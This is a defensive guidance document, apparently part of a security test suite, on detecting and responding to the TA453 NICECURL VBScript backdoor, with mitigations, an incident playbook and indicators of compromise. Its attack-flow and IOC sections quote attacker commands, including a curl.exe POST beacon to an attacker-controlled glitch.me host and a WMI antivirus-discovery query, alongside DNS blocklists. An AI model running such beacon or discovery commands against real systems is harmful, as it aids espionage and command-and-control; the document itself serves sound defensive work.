# Defense Guidance: TA453 NICECURL VBScript Backdoor Detection

## Executive Summary

This document provides comprehensive defense guidance for protecting against **TA453 NICECURL**, a modular VBScript backdoor deployed by Iran-aligned IRGC-IO threat actors. NICECURL uses Living off the Land (LotL) techniques -- leveraging legitimate Windows utilities (wscript.exe, wmic.exe, curl.exe) to blend with normal system activity while performing espionage operations.

| Field | Value |
|-------|-------|
| **Test ID** | 8e2cf534-857b-4d29-a1ac-0f23d248db93 |
| **Test Name** | TA453 NICECURL VBScript Backdoor Detection |
| **MITRE ATT&CK** | [T1204.002](https://attack.mitre.org/techniques/T1204/002/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/), [T1047](https://attack.mitre.org/techniques/T1047/), [T1518.001](https://attack.mitre.org/techniques/T1518/001/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1036.004](https://attack.mitre.org/techniques/T1036/004/) |
| **Tactics** | Execution, Discovery, Command and Control |
| **Threat Actor** | TA453 / APT42 / Charming Kitten / Mint Sandstorm |
| **Severity** | HIGH |
| **Test Score** | 8.5/10 |

---

## Threat Overview

### Attack Description

TA453 (tracked by various vendors as APT42, Charming Kitten, and Mint Sandstorm) is the most prolific Iranian threat group focused on human-targeted espionage. Their Cluster D operations deploy custom backdoors like NICECURL and TAMECAT for persistent access. NICECURL represents a shift toward LotL techniques, using legitimate Windows utilities to avoid detection.

### Attack Flow

```
[1] Malicious LNK Delivery (T1204.002 + T1059.005 + T1036.004)
    -> onedrive-form.pdf.lnk (double extension masquerading)
    -> Targets wscript.exe to execute VBScript payload
    -> Downloaded from attacker-controlled Glitch.me project
         |
         v
[2] WMI Security Software Discovery (T1047 + T1518.001)
    -> GetObject("winmgmts:").ExecQuery("Select * from AntiVirusProduct")
    -> Checks if environment is a "high-risk" sandbox
    -> Creates persistent victim ID at %LOCALAPPDATA%\config.txt
         |
         v
[3] curl.exe HTTPS C2 (T1071.001 + T1105)
    -> curl.exe -X POST https://accurate-sprout-porpoise.glitch.me/api/v2/check
    -> Base64-encoded beacon with victim ID
    -> Living off the Land - uses legitimate Windows curl.exe
    -> Downloads additional modules (T1105)
```

---

## Mitigation Strategies

### Stage 1: Malicious LNK Delivery (T1204.002 + T1059.005)

| Mitigation | MITRE ID | Implementation |
|------------|----------|----------------|
| ASR: Block VBS/VBE execution | M1040 | Enable ASR rule to block Office apps from creating child processes |
| Windows Defender SmartScreen | M1054 | Enable for unrecognized downloads |
| File extension visibility | M1017 | Show known file extensions via GPO |
| Script host restrictions | M1042 | Disable wscript.exe/cscript.exe for non-admin users via AppLocker |
| LNK file scanning | M1049 | Configure AV to scan inside LNK files |

**Key GPO Settings:**
- `User Configuration > Admin Templates > Windows Explorer > Hide extensions for known file types` = **Disabled**
- `Computer Configuration > Admin Templates > Windows Components > Windows Script Host > Turn off Windows Script Host` = **Enabled** (for non-IT users)

### Stage 2: WMI Security Discovery (T1047 + T1518.001)

| Mitigation | MITRE ID | Implementation |
|------------|----------|----------------|
| WMI event logging | M1031 | Enable WMI Trace logging via Event ID 5857-5861 |
| Restrict WMI access | M1026 | Limit WMI namespace access for non-admin users |
| WMIC deprecation | N/A | Block wmic.exe execution (deprecated in Windows 11) |
| PowerShell monitoring | M1049 | Enable Script Block Logging for WMI-based scripts |

**Audit Policy:**
```
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
```

### Stage 3: curl.exe C2 Communication (T1071.001 + T1105)

| Mitigation | MITRE ID | Implementation |
|------------|----------|----------------|
| Outbound HTTPS monitoring | M1031 | SSL/TLS inspection for suspicious domains |
| DNS filtering | M1037 | Block Glitch.me and similar PaaS hosting at DNS level |
| curl.exe restrictions | M1038 | Monitor or restrict curl.exe execution via AppLocker |
| Network segmentation | M1030 | Limit endpoints allowed to make outbound HTTPS |
| Web proxy enforcement | M1037 | Force all HTTP/S traffic through authenticated proxy |

**DNS Blocklist Additions:**
- `*.glitch.me`
- `*.glitch.io`
- `*.herokuapp.com`
- `*.replit.dev`

---

## Detection Summary

| # | Detection | Technique | Confidence | Platform |
|---|-----------|-----------|------------|----------|
| 1 | LNK double extension masquerading | T1204.002, T1036.004 | High | KQL, Sigma, EQL, LC D&R |
| 2 | VBScript execution from user directory | T1059.005 | High | KQL, Sigma, EQL, LC D&R |
| 3 | WMI SecurityCenter2 AV query | T1047, T1518.001 | High | KQL, Sigma, EQL, LC D&R |
| 4 | curl.exe HTTPS POST to PaaS hosting | T1071.001, T1105 | High | KQL, Sigma, EQL, LC D&R |
| 5 | Combined behavioral correlation | All | Critical | KQL |

---

## Incident Response Playbook

### Phase 1: Detection and Triage (0-30 minutes)

1. **Alert received**: Script interpreter (wscript/cscript) executing VBScript from non-standard path
2. **Validate alert**: Check parent process chain (expect LNK -> explorer.exe -> wscript.exe)
3. **Identify scope**: Search for related indicators on same host:
   - LNK files with double extensions in Downloads/Desktop
   - wmic.exe queries to SecurityCenter2
   - curl.exe HTTPS POST activity
   - `config.txt` files in %LOCALAPPDATA%

### Phase 2: Containment (30-60 minutes)

1. **Isolate host**: Network-isolate the affected endpoint
2. **Block C2 domains**: Add `*.glitch.me` to DNS blackhole
3. **Disable scripts**: Set `HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings\Enabled = 0`
4. **Preserve evidence**: Capture memory dump and disk image

### Phase 3: Investigation (1-4 hours)

1. **Identify delivery vector**: Check email logs for LNK attachments or links to Glitch.me
2. **Extract VBScript**: Recover the .vbs file from artifact directory or quarantine
3. **Analyze victim ID**: Read `%LOCALAPPDATA%\config.txt` for victim identifier
4. **Review curl history**: Check process creation logs for curl.exe commands
5. **Identify lateral movement**: Check if NICECURL was used to deploy TAMECAT or other tools

### Phase 4: Eradication (4-8 hours)

1. **Remove artifacts**:
   - Delete LNK files with double extensions
   - Remove VBScript payload files
   - Delete `%LOCALAPPDATA%\config.txt`
   - Remove any curl staging directories
2. **Scan for persistence**: Check Run keys, scheduled tasks, startup folder
3. **Verify no additional backdoors**: Search for TAMECAT indicators
4. **Reset credentials**: Change passwords for affected user accounts

### Phase 5: Recovery and Lessons Learned

1. **Re-enable monitoring**: Confirm all detection rules are active
2. **Deploy hardening**: Run hardening script on affected and similar endpoints
3. **Update threat intelligence**: Share IOCs with sector ISAC
4. **Review email security**: Strengthen attachment filtering for LNK files

---

## IOC Reference

### File-Based Indicators
- LNK files: `onedrive-form.pdf.lnk`, `*.pdf.lnk`
- VBScript files containing `SecurityCenter2` + `AntiVirusProduct`
- `%LOCALAPPDATA%\config.txt` with `victim_id=` prefix
- Base64-encoded `.dat` files in staging directories

### Network Indicators
- Domains: `*.glitch.me` (especially randomly named subdomains)
- User-Agent: `NICECURL/*`, `Mozilla/5.0 (Windows NT 10.0; Win64; x64) NICECURL/*`
- Custom headers: `X-Request-ID` with victim identifiers
- curl.exe HTTPS POST with base64-encoded body

### Process Indicators
- `wscript.exe //Nologo //B <path>.vbs`
- `wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct`
- `curl.exe -X POST -H "X-Request-ID: ..." https://*.glitch.me`

---

## Hardening Script

A PowerShell hardening script is provided: `8e2cf534-857b-4d29-a1ac-0f23d248db93_hardening.ps1`

The script applies:
1. Windows Script Host restrictions for non-admin users
2. File extension visibility enforcement
3. WMI event logging enablement
4. Firewall rules restricting curl.exe outbound on non-standard ports
5. AppLocker guidance for script interpreter restrictions
6. Audit policy for WMI and process creation events
